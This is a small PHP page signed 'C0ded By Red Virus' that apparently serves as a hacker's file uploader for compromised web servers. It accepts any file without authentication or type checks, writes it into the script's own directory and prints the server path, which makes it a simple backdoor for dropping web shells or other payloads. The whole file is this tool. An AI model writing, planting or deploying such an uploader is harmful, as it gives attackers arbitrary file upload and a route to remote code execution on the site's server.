<!DOCTYPE html>
<!-- C0ded By Red Virus -->
<html>
<head>
	<title>Upload File</title>
<style>
	p{
		font-size: 20px;
	}
	body{
		background-image:url(https://j.top4top.io/p_16654ocjt1.jpg);
	}
</style>
</head>
<body>
	<form action="<?php echo $_SERVER['PHP_SELF'] ;?>" method="post"  enctype="multipart/form-data">
		<input type="file" name="word">
		<input type="submit" name="loading">
	</form>
</body>
</html>
<?php
$files = @$_FILES['word'];
if(isset($_POST['loading'])){
	$path = getcwd() . "/" . $files['name'];
	if(move_uploaded_file($files['tmp_name'],$path)){
		echo "<p style='color:white'>" . "has been uploaded"  . "</p>";
		echo "<p style='color:red'>" . $path . "</p>";
	}
	else{
		echo "<p style='white'> ". "Error please try again !" . "</p>";
	}
}
